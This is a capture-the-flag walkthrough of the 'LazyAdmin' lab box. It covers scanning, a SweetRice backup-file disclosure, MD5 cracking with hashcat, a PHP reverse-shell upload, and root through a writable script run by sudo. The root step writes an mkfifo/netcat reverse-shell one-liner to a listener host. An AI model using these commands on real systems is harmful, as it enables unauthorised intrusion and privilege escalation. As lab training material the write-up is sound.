# LazyAdmin

## :man\_mechanic: Lazy Admin

### **#1 What is the user flag?**

#### Step 1

```bash
sudo nmap 10.10.181.122
gobuster dir -u http://10.10.181.122/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-07-28.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-31 08-56-26.png>)

#### Step 2

```bash
searchsploit sweetrice
cat /usr/share/exploitdb/exploits/php/webapps/40718.txt
wget http://10.10.181.122/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
cat mysql_bakup_20191129023059-1.5.1.sql | grep --color passwd
```

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-16-13.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-31 09-15-01.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-31 09-17-40.png>)

#### Step 3

```bash
echo -n '42f749ade7f9e195bf475f37a44cafcb' > md5.txt
hashcat -a 0 -m 0 md5.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-22-33.png>)

#### Step 4

```bash
nc -nvlp 4444
```

```bash
# http://10.10.181.122/content/inc/ads/shell.php
find / -name user.txt 2>/dev/null
cat /home/itguy/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-25-44.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-30-29.png>)

### **#2 What is the root flag?**

```bash
sudo -l
cat /home/itguy/backup.pl
cat /etc/copy.sh 
ls -l /etc/copy.sh
echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.101.193 4445 >/tmp/f' > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
nc -nvlp 4445
find / -name root.txt 2>/dev/null
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-36-07.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-31 10-36-05.png>)

### ****:link: **Support Material**

{% embed url="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" %}
